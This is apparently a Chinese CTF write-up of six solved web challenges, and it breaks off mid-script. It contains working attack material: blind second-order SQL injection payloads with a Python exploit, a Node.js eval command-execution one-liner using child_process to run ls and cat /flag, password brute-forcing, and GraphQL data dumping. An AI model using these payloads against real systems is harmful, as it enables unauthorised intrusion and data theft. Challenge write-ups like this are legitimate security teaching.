### 前言
竞技赛持续了7天，为了肝题也是7天没有睡好觉，不过这个比赛也学到很多，在这里比心出题师傅和客服师傅们，比赛真的办的很用心。这次总共16道Web题，最后肝出了11道，6道一血，1道三血。WP尽量具体，把我整个做题过程的思路带上。希望能给大家带来帮助~
### 1.给赵总征婚（300 points）
考点：爆破密码
解题步骤：
1.用源码提示的 **rockyou** 字典爆破 **admin** 的密码即可
### 2.NSB Reset Password（300 points）
考点：Session
解题步骤：
1.打开靶机，发现跟上一题征婚相比，多了一个注册功能，随便注册一个账号登陆
2.还有个 **重置密码** 的页面排除上一题爆破密码的可能，猜测这题需要重置 **admin** 的密码
3.重置密码需要通过一个 **验证码校验** ，验证码是通过发送邮箱获得，但是我们不知道admin的邮箱
4.另外发现，删了cookie后，原来的账号就不存在了，说明，这题是根据 **session**
来判断当前用户的，那么就可以猜想，如果我们一开始去修改我们注册的用户，然后利用自己邮箱的验证码通过验证，再用另一个页面同样的 **session**
去重置admin，而当前重置的密码根据session判断我们要修改的用户（此时已经变成了admin），所以即可成功修改admin的密码
5.重置密码后登陆admin获得flag
### 3.Twice_injection(500 points)
考点：二次注入，mysql5.7特性
解题步骤：
1.打开靶机，发现环境是sql-labs 第24关，注入点在 **pass_change.php**
的修改密码处的用户名字段，因为是直接从Session中取出后拼接到update语句中，从而造成二次注入
2.按照sql-labs的做法，修改admin用户密码，登陆后发现没有flag，说明flag在数据库中
3.布尔盲注，盲注payload：
    admin' and ascii(substr(database(),%d,1))=%d#
在username字段后构造条件语句，如果条件为真，则修改密码成功，为假则修改密码失败
4.注出数据库名： **security** ，在尝试注表时发现关键字 **or** 被过滤了，所以不能使用 **information_schema**
5.注版本信息发现mysql版本为 **5.7** ，所以可以利用自带的 **mysql** 库中新增的 **innodb_table_stats**
这个表，来获得数据库名和表名，参考：
6.注表名payload：
    admin' and ascii(substr((select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()),%d,1))=%d#
7.获得 **fl4g** 表：
8.最后获取flag的exp：
    import requests
    index_url = "http://101.71.29.5:10002/index.php"
    login_url = "http://101.71.29.5:10002/login.php"
    pass_change_url = "http://101.71.29.5:10002/pass_change.php"
    register_url = "http://101.71.29.5:10002/login_create.php"
    s = requests.Session()
    database = ""#mysql,security,sys
    version = "5.7.27"
    table_name = "emails,referers,uagents,users" #gtid_executed,fl4g,sys
    for i in range(1,50):
        for j in range(44,128):
            register_data = {
                "username":"admin' and ascii(substr((select * from fl4g),%d,1))=%d######################somnus1234567890121"%(i,j),
                "password":"123",
                "re_password":"123",
                "submit":"Register"
            }
            r1 = s.post(register_url,data=register_data)
            login_data = {
                "login_user":"admin' and ascii(substr((select * from fl4g),%d,1))=%d######################somnus1234567890121"%(i,j),
                "login_password": "123",
                "mysubmit": "Login"
            }
            r2 = s.post(login_url,data=login_data)
            pass_change_data = {
                "current_password": "123",
                "password": "somnus1" + str(i),
                "re_password": "somnus1" + str(i),
                "submit": "Reset"
            }
            r3 = s.post(pass_change_url, data=pass_change_data)
            if "Password successfully updated" in r3.text:
                database = database + chr(j)
                print database
                break
### 4.checkin(600 points)
考点：nodejs注入
解题步骤：
1.打开靶机，发现是一个websocket的js网站，/js/app.03bc1faf.js中可以看到源码
2.根据提示，需要我们先输入 **/name nickname** 来进行登陆，登陆后，审计源码发现可以执行一个calc操作
3.执行`/calc 5*6`
发现返回30，猜测这里存在命令执行，参考：[Node.js代码审计之eval远程命令执行漏洞](http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)
4.调用 **child_process** 模块执行命令，题目过滤了空格，用`$IFS`替代
5.执行ls：
    /calc require("child_process").execSync("ls$IFS/").toString()
6.cat flag：
    /calc require("child_process").execSync("cat$IFS/flag").toString()
### 5.简单的备忘录(800 points)
考点：graphql
解题步骤：
1.打开靶机，有个链接，访问发现是一个 **graphql** 的查询接口
2.通过[get-graphql-schema](https://github.com/prisma-labs/get-graphql-schema)工具将graphql模式都一一列举出来：
    $get-graphql-schema http://101.71.29.5:10012/graphql
3.摸清层次后，进行层层 **嵌套查询** ：
    {
      allUsers {
        edges {
          node {
            id
            username
            memos{
              pageInfo {
                hasPreviousPage
                hasNextPage
                startCursor
                endCursor
              }
              edges{
                node{
                  id
                  content
                }
              }
            }
          }
          cursor
        }
      }
    }
4.flag就在 **Meno** 类的 **content** 字段中
### 6.加密的备忘录(1000 points)
考点：graphql，unicode变形编码还原
解题步骤：
1.打开靶机，源码提示我们：
2.访问一下，还是有graphql接口，只是没有像上一题那样写一个界面
3.同样用 **get-graphql-schema** 列出结构：
4.相比于上一题，发现 **Query** 类中多了一个方法 **checkPass** ，类 **Memo_** 也多了一个成员属性
**password** ，我们同样用上一关的payload来查询一下结果
5.查询结果发现，相比于之前那题， **content** 字段和多出来的 **password** 字段的值看起来像是经过 **unicode**
编码，将password字段值拿去unicode解码,发现是一串很奇怪的汉字
6.想到还有一个方法 **checkPass** 没试，于是构造一下数据包：
从查询结果来分析，我们输入的 **password：1** 貌似经过了unicode编码后，返回告诉我们这个密码查询结果为空
7.把1经过unicode编码后的字符串：\u4e3a\u6211\u7231\u7231，再次拿去解码，又是一串看不懂的中文：
8.而如果我们直接把前面查的password字段中的字符串拿来查询，结果出现整形溢出而报错
9.所以猜测：这个 **checkPass**
方法会将我们查询的password值进行一次变形的unicode编码后，进行查询，那么，我们就需要将password字段值进行还原明文的操作。通过测试发现，可以进行
**逐位爆破** 明文，现在我们要破解的是password密文：
    \u8981\u6709\u4e86\u4ea7\u4e8e\u4e86\u4e3b\u65b9\u4ee5\u5b9a\u4eba\u65b9\u4e8e\u6709\u6210\u4ee5\u4ed6\u7684\u7231\u7231
那么，首先先对第一个密文字符串： **\u8981** 进行解密
首先爆破第一位明文：
爆破发现，第一个明文范围可能为 **[H-K]**
第二个明文，就根据第一个明文的可能来列举爆破，看看是否符合最前面两串密文字符串： **\u8981\u6709**
发现，第一个明文字符为 **H** 时，第二个明文字符为 **[a-o]** ，前两串密文都满足： **\u8981\u6709**
由此确定，第一个明文字符为： **H**
以此类推，根据checkPass返回的结果来逐位爆破出明文
10.按照这个思路，编写爆破exp，代码如下：
    import requests
    import string
    import json
    import re
    from time import sleep
    url = "http://101.71.29.5:10037/graphql"
    s = string.ascii_letters + string.digits + "{}"
    password = "\u8981\u6709\u4e86\u4ea7\u4e8e\u4e86\u4e3b\u65b9\u4ee5\u5b9a\u4eba\u65b9\u4e8e\u6709\u6210\u4ee5\u4ed6\u7684\u7231\u7231"
    #password = "\u5230\u5e74\u79cd\u6210\u5230\u5b9a\u8fc7\u6210\u4e2a\u4ed6\u6210\u4f1a\u4e3a\u800c\u65f6\u65b9\u4e0a\u800c\u5230\u5e74\u5230\u5e74\u4ee5\u53ef\u4e3a\u591a\u4e3a\u800c\u5230\u53ef\u5bf9\u65b9\u751f\u800c\u4ee5\u5e74\u4e3a\u6709\u5230\u6210\u4e0a\u53ef\u6211\u884c\u5230\u4ed6\u7684\u9762\u4e3a\u4eec\u65b9\u7231"
    find_password = ""
    change_password = ""#HappY4Gr4phQL
    pass_list = password.split("\u")[1:]
    count = 0
    query = {"query":"{\n  checkPass(memoId: 1, password:\"%s\")\n}\n"}
    query = json.dumps(query)
    headers = {
        "Content-Type":"application/json"
    }
    while find_password != password:
        possible_list = []
        end = 0
        for i in s:
            payload = query % (change_password + i)
            s1 = requests.Session()
            r = s1.post(url,headers= headers,data=payload)
            sleep(0.1)